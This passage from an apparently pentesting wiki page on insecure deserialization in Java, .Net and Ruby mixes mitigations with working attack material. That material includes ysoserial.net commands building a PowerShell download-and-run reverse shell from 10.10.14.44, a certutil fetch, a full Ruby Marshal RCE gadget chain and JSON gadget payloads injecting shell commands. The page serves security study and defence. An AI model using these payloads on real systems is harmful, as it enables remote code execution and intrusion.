throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Using a Java Agent for Security Enhancement** ofrece una solución alternativa cuando no es posible modificar el código. Este método se aplica principalmente para **blacklisting harmful classes**, utilizando un parámetro de la JVM:
```
-javaagent:name-of-agent.jar
```
Proporciona una forma de asegurar la deserialización de manera dinámica, ideal para entornos donde los cambios de código inmediatos son poco prácticos.

Consulta un ejemplo en [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Implementación de filtros de serialización**: Java 9 introdujo filtros de serialización mediante la interfaz **`ObjectInputFilter`**, proporcionando un mecanismo potente para especificar criterios que los objetos serializados deben cumplir antes de ser deserializados. Estos filtros pueden aplicarse de forma global o por flujo, ofreciendo un control granular sobre el proceso de deserialización.

Para utilizar los filtros de serialización, puedes establecer un filtro global que se aplique a todas las operaciones de deserialización o configurarlo dinámicamente para flujos específicos. Por ejemplo:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Aprovechamiento de bibliotecas externas para mayor seguridad**: Libraries such as **NotSoSerial**, **jdeserialize**, and **Kryo** offer advanced features for controlling and monitoring Java deserialization. Estas bibliotecas pueden proporcionar capas adicionales de seguridad, como whitelisting o blacklisting de clases, analizar objetos serialized antes de la deserialization e implementar estrategias personalizadas de serialization.

- **NotSoSerial** intercepta los procesos de deserialization para prevenir la ejecución de untrusted code.
- **jdeserialize** permite el análisis de objetos Java serialized sin deserializarlos, ayudando a identificar contenido potencialmente malicious.
- **Kryo** es un framework alternativo de serialization que enfatiza la velocidad y eficiencia, ofreciendo estrategias de serialization configurables que pueden mejorar la seguridad.

### References

- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- Deserialization and ysoserial talk: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
- [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
- Talk about gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) and slides: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
- Marshalsec paper: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
- [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
- [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
- [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
- Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** talk: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) and slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- Deserialziations CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

Encuentra qué es **JNDI Injection, cómo abusar de ella via RMI, CORBA & LDAP y cómo explotar log4shell** (y un ejemplo de esta vuln) en la siguiente página:


{{#ref}}
jndi-java-naming-and-directory-interface-and-log4shell.md
{{#endref}}

## JMS - Java Message Service

> The **Java Message Service** (**JMS**) API is a Java message-oriented middleware API for sending messages between two or more clients. It is an implementation to handle the producer–consumer problem. JMS is a part of the Java Platform, Enterprise Edition (Java EE), and was defined by a specification developed at Sun Microsystems, but which has since been guided by the Java Community Process. It is a messaging standard that allows application components based on Java EE to create, send, receive, and read messages. It allows the communication between different components of a distributed application to be loosely coupled, reliable, and asynchronous. (From [Wikipedia](https://en.wikipedia.org/wiki/Java_Message_Service)).

### Products

There are several products using this middleware to send messages:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (1056).png>)

### Exploitation

Básicamente existen **muchos servicios que usan JMS de forma peligrosa**. Por lo tanto, si tienes **suficientes privilegios** para enviar mensajes a estos servicios (normalmente necesitarás credenciales válidas) podrías ser capaz de enviar **malicious objects serialized que serán deserialized por el consumer/subscriber**.\
Esto significa que en esta explotación todos los **clients que vayan a usar ese mensaje se verán infectados**.

Debes recordar que incluso si un servicio es vulnerable (porque está deserializing entrada de usuario de forma insegura) todavía necesitas encontrar gadgets válidos para explotar la vulnerabilidad.

La herramienta [JMET](https://github.com/matthiaskaiser/jmet) fue creada para **conectarse y atacar estos servicios enviando varios malicious objects serialized usando gadgets conocidos**. Estos exploits funcionarán si el servicio sigue siendo vulnerable y si cualquiera de los gadgets usados está presente en la aplicación vulnerable.

### References

- [Patchstack advisory – Everest Forms unauthenticated PHP Object Injection (CVE-2025-52709)](https://patchstack.com/articles/critical-vulnerability-impacting-over-100k-sites-patched-in-everest-forms-plugin/)

- JMET talk: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
- Slides: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

En el contexto de .Net, las exploits de deserialization operan de manera similar a las encontradas en Java, donde se explotan gadgets para ejecutar código específico durante la deserialization de un objeto.

### Fingerprint

#### WhiteBox

El código fuente debe inspeccionarse en busca de ocurrencias de:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

El enfoque debe estar en serializers que permitan que el tipo sea determinado por una variable bajo control del usuario.

#### BlackBox

La búsqueda debe dirigirse a la cadena codificada en Base64 **AAEAAAD/////** o cualquier patrón similar que pueda sufrir deserialization en el servidor, otorgando control sobre el tipo a deserializar. Esto podría incluir, pero no limitarse a, estructuras **JSON** o **XML** que presenten `TypeObject` o `$type`.

### ysoserial.net

En este caso puedes usar la herramienta [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) para **crear los exploits de deserialization**. Una vez descargado el repositorio git deberías **compilar la herramienta** usando Visual Studio, por ejemplo.

Si quieres aprender **cómo ysoserial.net crea su exploit** puedes [**revisar esta página donde se explica el gadget ObjectDataProvider + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

The main options of **ysoserial.net** are: **`--gadget`**, **`--formatter`**, **`--output`** and **`--plugin`.**

- **`--gadget`** se usa para indicar el gadget a abusar (indicar la clase/función que será abusada durante la deserialization para ejecutar comandos).
- **`--formatter`**, se usa para indicar el método para serialized el exploit (necesitas saber qué librería está usando el back-end para deserializar el payload y usar la misma para serializarlo).
- **`--output`** se usa para indicar si quieres el exploit en **raw** o en **base64** codificado. _Nota que **ysoserial.net** **encode** el payload usando **UTF-16LE** (encoding usado por defecto en Windows) así que si obtienes el raw y simplemente lo codificas desde una consola linux podrías tener algunos **encoding compatibility problems** que impedirán que el exploit funcione correctamente (en la HTB JSON box el payload funcionó tanto en UTF-16LE como en ASCII pero esto no significa que siempre vaya a funcionar)._
- **`--plugin`** ysoserial.net soporta plugins para crear **exploits para frameworks específicos** como ViewState

#### More ysoserial.net parameters

- `--minify` proporcionará un **payload más pequeño** (si es posible)
- `--raf -f Json.Net -c "anything"` Esto listará todos los gadgets que pueden usarse con un formatter proporcionado (`Json.Net` en este caso)
- `--sf xml` puedes **indicar un gadget** (`-g`) y ysoserial.net buscará formatters que contengan "xml" (insensible a mayúsculas)

**ysoserial examples** para crear exploits:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** también tiene un **parámetro muy interesante** que ayuda a entender mejor cómo funciona cada exploit: `--test`\
Si indicas este parámetro, **ysoserial.net** **intentará** el **exploit localmente,** para que puedas probar si tu payload funcionará correctamente.\
Este parámetro es útil porque si revisas el código encontrarás fragmentos de código como el siguiente (de [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Esto significa que, para probar el exploit, el código llamará a [serializersHelper.JsonNet_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
En el **código anterior es vulnerable al exploit creado**. Así que si encuentras algo similar en una aplicación .Net, probablemente esa aplicación también sea vulnerable.  
Por ello el parámetro **`--test`** nos permite entender **qué fragmentos de código son vulnerables** al exploit de deserialización que **ysoserial.net** puede generar.

### ViewState

Echa un vistazo a [este POST sobre **cómo intentar explotar el parámetro \_\_ViewState de .Net**](exploiting-__viewstate-parameter.md) para **ejecutar código arbitrario.** Si **ya conoces los secretos** utilizados por la máquina víctima, [**lee este post para saber cómo ejecutar código**](exploiting-__viewstate-knowing-the-secret.md).

### Prevention

Para mitigar los riesgos asociados con la deserialización en .Net:

- **Evitar permitir que los flujos de datos definan sus tipos de objeto.** Utiliza `DataContractSerializer` o `XmlSerializer` cuando sea posible.
- **Para `JSON.Net`, establece `TypeNameHandling` en `None`:** `TypeNameHandling = TypeNameHandling.None`
- **Evitar usar `JavaScriptSerializer` con un `JavaScriptTypeResolver`.**
- **Limitar los tipos que pueden deserializarse**, comprendiendo los riesgos inherentes con los tipos de .Net, como `System.IO.FileInfo`, que puede modificar propiedades de archivos del servidor, potencialmente provocando ataques de denegación de servicio.
- **Tener precaución con tipos que tienen propiedades riesgosas**, como `System.ComponentModel.DataAnnotations.ValidationException` con su propiedad `Value`, que puede ser explotada.
- **Controlar de forma segura la instanciación de tipos** para impedir que atacantes influyan en el proceso de deserialización, volviendo incluso a `DataContractSerializer` o `XmlSerializer` vulnerables.
- **Implementar controles de lista blanca** usando un `SerializationBinder` personalizado para `BinaryFormatter` y `JSON.Net`.
- **Mantenerse informado sobre gadgets de deserialización inseguros conocidos** dentro de .Net y asegurar que los deserializadores no instancien tales tipos.
- **Aislar código potencialmente riesgoso** del código con acceso a internet para evitar exponer gadgets conocidos, como `System.Windows.Data.ObjectDataProvider` en aplicaciones WPF, a fuentes de datos no confiables.

### **References**

- Paper sobre deserialización JSON en Java y .Net: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** charla: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) y diapositivas: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp)
- [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

En Ruby, la serialización se facilita mediante dos métodos de la librería **marshal**. El primer método, conocido como **dump**, se usa para transformar un objeto en una secuencia de bytes. Este proceso se denomina serialización. Por el contrario, el segundo método, **load**, se emplea para revertir una secuencia de bytes de vuelta a un objeto, un proceso conocido como deserialización.

Para asegurar objetos serializados, **Ruby emplea HMAC (Hash-Based Message Authentication Code)**, garantizando la integridad y autenticidad de los datos. La llave utilizada para este propósito se almacena en una de varias ubicaciones posibles:

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.X generic deserialization to RCE gadget chain (more info in** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Otra cadena RCE para explotar Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() method

Como se explica en [**this vulnerability report**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), si una entrada de usuario no sanitizada llega al método `.send()` de un objeto ruby, este método permite **invocar cualquier otro método** del objeto con cualquier parámetro.

Por ejemplo, llamar a eval y luego código ruby como segundo parámetro permitirá ejecutar código arbitrario:
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
Además, si solo un parámetro de **`.send()`** está controlado por un atacante, como se mencionó en el previous writeup, es posible invocar cualquier método del objeto que **no requiera argumentos** o cuyos argumentos tengan **valores por defecto**.\
Para ello, es posible enumerar todos los métodos del objeto para **encontrar algunos métodos interesantes que cumplan esos requisitos**.
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
### Ruby class pollution

Revisa cómo podría ser posible [pollute a Ruby class and abuse it in here](ruby-class-pollution.md).

### Ruby _json pollution

Al enviar en un body algunos valores no hashables como un array, se añadirán en una nueva clave llamada `_json`. Sin embargo, es posible que un atacante también establezca en el body un valor llamado `_json` con los valores arbitrarios que desee. Luego, si el backend, por ejemplo, comprueba la veracidad de un parámetro pero también usa el parámetro `_json` para realizar alguna acción, podría producirse un bypass de autorización.

Consulta más información en la [Ruby _json pollution page](ruby-_json-pollution.md).

### Otras librerías

Esta técnica fue tomada[ **from this blog post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

Hay otras librerías de Ruby que pueden usarse para serializar objetos y que, por lo tanto, podrían ser abusadas para obtener RCE durante un insecure deserialization. La tabla siguiente muestra algunas de estas librerías y el método que llaman de la librería cargada cuando se deserializa (función para abusar y obtener RCE básicamente):

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>Library</strong></td><td><strong>Input data</strong></td><td><strong>Kick-off method inside class</strong></td></tr><tr><td>Marshal (Ruby)</td><td>Binary</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (class needs to be put into hash(map) as key)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([see notes regarding json_create at end](#table-vulnerable-sinks))</td></tr></tbody></table>

Ejemplo básico:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
En el caso de intentar abusar de Oj, fue posible encontrar una clase gadget que, dentro de su función `hash`, llama a `to_s`, que a su vez llama a spec, que llama a fetch_path, lo que se pudo aprovechar para hacer que recuperara una URL aleatoria, convirtiéndolo en un excelente detector de este tipo de vulnerabilidades de deserialización no saneadas.
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport",
"path": "/",
"user": "anyuser",
"password": "anypw"
}
```
Además, se encontró que con la técnica anterior también se crea una carpeta en el sistema, lo cual es un requisito para abusar de otro gadget con el fin de transformar esto en un RCE completo con algo como:
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
Check for more details in the [**original post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

### Bootstrap Caching

No es realmente una desearilization vuln, pero es un truco útil para abusar del bootstrap caching y conseguir RCE en una aplicación Rails con un arbitrary file write (find the complete [original post in here](https://blog.convisoappsec.com/en/from-arbitrary-file-write-to-rce-in-restricted-rails-apps/)).

Below is a short summary of the steps detailed in the article for exploiting an arbitrary file write vulnerability by abusing Bootsnap caching:

- Identify the Vulnerability and Environment

La funcionalidad de subida de archivos de la app Rails permite a un atacante escribir archivos arbitrariamente. Aunque la app se ejecuta con restricciones (solo ciertos directorios como tmp son escribibles debido al non-root user de Docker), esto todavía permite escribir en el directorio de caché de Bootsnap (típicamente bajo tmp/cache/bootsnap).

- Understand Bootsnap’s Cache Mechanism

Bootsnap acelera los tiempos de arranque de Rails almacenando en caché código Ruby compilado, archivos YAML y JSON. Guarda archivos de caché que incluyen un cache key header (con campos como Ruby version, file size, mtime, compile options, etc.) seguido por el código compilado. Este header se usa para validar la caché durante el inicio de la app.

- Gather File Metadata

El atacante primero selecciona un archivo objetivo que probablemente se cargue durante el arranque de Rails (por ejemplo, set.rb de la standard library de Ruby). Ejecutando Ruby dentro del contenedor, extraen metadatos críticos (como RUBY_VERSION, RUBY_REVISION, size, mtime, y compile_option). Estos datos son esenciales para crear una cache key válida.

- Compute the Cache File Path

Replicando el mecanismo de hashing FNV-1a 64-bit de Bootsnap se determina la ruta correcta del archivo de caché. Este paso asegura que el archivo de caché malicioso se coloque exactamente donde Bootsnap lo espera (por ejemplo, bajo tmp/cache/bootsnap/compile-cache-iseq/).

- Craft the Malicious Cache File

El atacante prepara un payload que:

- Ejecuta comandos arbitrarios (por ejemplo, ejecutar id para mostrar información del proceso).
- Elimina la caché maliciosa después de la ejecución para prevenir explotación recursiva.
- Carga el archivo original (p. ej., set.rb) para evitar que la aplicación se caiga.

Este payload se compila en código Ruby binario y se concatena con un cache key header cuidadosamente construido (usando los metadatos recopilados previamente y el número de versión correcto de Bootsnap).

- Overwrite and Trigger Execution

Usando la vulnerabilidad de arbitrary file write, el atacante escribe el archivo de caché creado en la ubicación calculada. Luego, provocan un reinicio del servidor (escribiendo en tmp/restart.txt, que es monitorizado por Puma). Durante el reinicio, cuando Rails requiere el archivo objetivo, se carga el archivo de caché malicioso, resultando en remote code execution (RCE).



### Ruby Marshal explotación en la práctica (updated)

Considera cualquier ruta donde bytes no confiables lleguen a `Marshal.load`/`marshal_load` como un RCE sink. Marshal reconstruye grafos de objetos arbitrarios y dispara callbacks de librerías/gems durante la materialización.


- Minimal vulnerable Rails code path:
```ruby
class UserRestoreController < ApplicationController
def show
user_data = params[:data]
if user_data.present?
deserialized_user = Marshal.load(Base64.decode64(user_data))
render plain: "OK: #{deserialized_user.inspect}"
else
render plain: "No data", status: :bad_request
end
end
end
```
- Clases de gadget comunes vistas en chains reales: `Gem::SpecFetcher`, `Gem::Version`, `Gem::RequestSet::Lockfile`, `Gem::Resolver::GitSpecification`, `Gem::Source::Git`.
- Marcador típico de efecto secundario incrustado en payloads (ejecutado durante unmarshal):
```
*-TmTT="$(id>/tmp/marshal-poc)"any.zip
```
Dónde aparece en aplicaciones reales:
- Rails cache stores y session stores que históricamente usan Marshal
- Backends de background jobs y file-backed object stores
- Cualquier persistencia personalizada o transporte de blobs binarios de objetos

Descubrimiento industrializado de gadgets:
- Grep para constructors, `hash`, `_load`, `init_with`, o métodos con efectos secundarios invocados durante el unmarshal
- Usa CodeQL’s Ruby unsafe deserialization queries para trazar sources → sinks y exponer gadgets
- Valida con PoCs públicos multi-formato (JSON/XML/YAML/Marshal)


## Referencias

- Trail of Bits – Marshal madness: A brief history of Ruby deserialization exploits: https://blog.trailofbits.com/2025/08/20/marshal-madness-a-brief-history-of-ruby-deserialization-exploits/
- elttam – Ruby 2.x Universal RCE Deserialization Gadget Chain: https://www.elttam.com/blog/ruby-deserialization/
- Phrack #69 – Rails 3/4 Marshal chain: https://phrack.org/issues/69/12.html
- CVE-2019-5420 (Rails 5.2 insecure deserialization): https://nvd.nist.gov/vuln/detail/CVE-2019-5420
- ZDI – RCE via Ruby on Rails Active Storage insecure deserialization: https://www.zerodayinitiative.com/blog/2019/6/20/remote-code-execution-via-ruby-on-rails-active-storage-insecure-deserialization
- Include Security – Discovering gadget chains in Rubyland: https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/
- GitHub Security Lab – Ruby unsafe deserialization (query help): https://codeql.github.com/codeql-query-help/ruby/rb-unsafe-deserialization/
- GitHub Security Lab – PoCs repo: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization
- Doyensec PR – Ruby 3.4 gadget: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/pull/1
- Luke Jahnke – Ruby 3.4 universal chain: https://nastystereo.com/security/ruby-3.4-deserialization.html
- Luke Jahnke – Gem::SafeMarshal escape: https://nastystereo.com/security/ruby-safe-marshal-escape.html
- Ruby 3.4.0-rc1 release: https://github.com/ruby/ruby/releases/tag/v3_4_0_rc1
- Ruby fix PR #12444: https://github.com/ruby/ruby/pull/12444
- Trail of Bits – Auditing RubyGems.org (Marshal findings): https://blog.trailofbits.com/2024/12/11/auditing-the-ruby-ecosystems-central-package-repository/
- watchTowr Labs – Is This Bad? This Feels Bad — GoAnywhere CVE-2025-10035: https://labs.watchtowr.com/is-this-bad-this-feels-bad-goanywhere-cve-2025-10035/

{{#include ../../banners/hacktricks-training.md}}
